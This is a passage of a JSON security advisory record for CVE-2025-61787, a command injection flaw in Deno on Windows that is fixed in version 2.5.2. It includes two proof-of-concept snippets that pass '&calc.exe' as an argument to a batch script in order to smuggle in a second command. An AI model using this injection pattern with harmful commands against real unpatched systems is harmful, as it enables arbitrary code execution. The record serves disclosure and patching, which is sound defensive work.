This makes Deno vulnerable to a command injection attack on Windows as demonstrated by the two proves-of-concept below.\n\n### PoC\nUsing `node:child_process` (with the `env` and `run` permissions):\n```JS\nconst { spawn } = require('node:child_process');\nconst child = spawn('./test.bat', ['&calc.exe']);\n```\nUsing `Deno.Command.spawn()` (with the `run` permission):\n```JS\nconst command = new Deno.Command('./test.bat', {\n  args: ['&calc.exe'],\n});\nconst child = command.spawn();\n```\n\n### Impact\nBoth of these scripts result in opening calc.exe on Windows, thus allowing a Command Line Injection attack when user-provided arguments are passed if the script being executed by the child process is a batch script.","affected":[{"package":{"name":"deno","ecosystem":"crates.io","purl":"pkg:cargo/deno"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"2.5.2"}]}],"database_specific":{"source":"https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/10/GHSA-m2gf-x3f6-8hq3/GHSA-m2gf-x3f6-8hq3.json"}}],"references":[{"type":"WEB","url":"https://github.com/denoland/deno/security/advisories/GHSA-m2gf-x3f6-8hq3"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-61787"},{"type":"WEB","url":"https://github.com/denoland/deno/pull/30818"},{"type":"WEB","url":"https://github.com/denoland/deno/commit/8a0990ccd37bafd8768176ca64b906ba2da2d822"},{"type":"PACKAGE","url":"https://github.com/denoland/deno"},{"type":"WEB","url":"https://github.com/denoland/deno/releases/tag/v2.2.15"},{"type":"WEB","url":"https://github.com/denoland/deno/releases/tag/v2.5.2"}],"database_specific":{"cwe_ids":["CWE-77"],"github_reviewed":true,"github_reviewed_at":"2025-10-08T18:16:24Z","nvd_published_at":"2025-10-08T02:15:41Z","severity":"HIGH"},"severity":[{"type":"CVSS_V3","score":"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}]}
